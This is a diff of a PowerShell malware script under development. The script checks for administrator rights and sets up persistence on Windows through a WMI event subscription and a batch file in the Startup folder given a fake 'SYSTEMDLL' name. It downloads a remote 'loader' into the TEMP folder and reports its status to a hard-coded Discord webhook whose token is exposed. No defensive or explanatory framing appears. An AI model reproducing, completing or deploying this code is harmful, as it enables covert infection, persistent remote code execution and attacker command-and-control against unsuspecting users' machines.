@@ -1,3 +1,4 @@
+
 $temp = $env:TEMP;
 $userprof = $env:USERPROFILE;
 $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";
@@ -7,15 +8,16 @@ $uri = "https://discord.com/api/webhooks/971409555361779712/IbhO1R1Oe6utsRnMVBNV
 
 $ADMIN = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
 
-if ($ADMIN -eq $false){
-    copy-item $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat -Destination $startUpFolder
-    $hash = @{ "content" = "not admin.....persistence my not work"; }
+$path = test-path $load
+if ($PATH -eq $false){
+    #copy-item $temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat -Destination $startUpFolder
+    $hash = @{ "content" = "NO PERSISTENCE BAT IN STARTUPk"; }
     $JSON = $hash | convertto-json
     Invoke-RestMethod -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
 
 }
-$path = test-path $load
-if($path -eq $true -and $ADMIN -eq $True){
+
+if($ADMIN -eq $true -and $ADMIN -eq $True){
     $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325";
     $EventFilterArgs = @{
         EventNamespace = 'root\cimv2'
@@ -45,7 +47,7 @@ if($path -eq $true -and $ADMIN -eq $True){
     $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
     $wc.DownloadFile("$loader","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat");
 
-    $hash = @{ "content" = "error during persistence"; }
+    $hash = @{ "content" = "error during persistence - NOT ADMIN"; }
     $JSON = $hash | convertto-json
     Invoke-WebRequest -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}
 }
@@ -93,3 +95,4 @@ catch {
      # catches 404 too
      Write-Debug "StatusCode: $($_.Exception.Response.StatusCode.Value__)"
 }
+
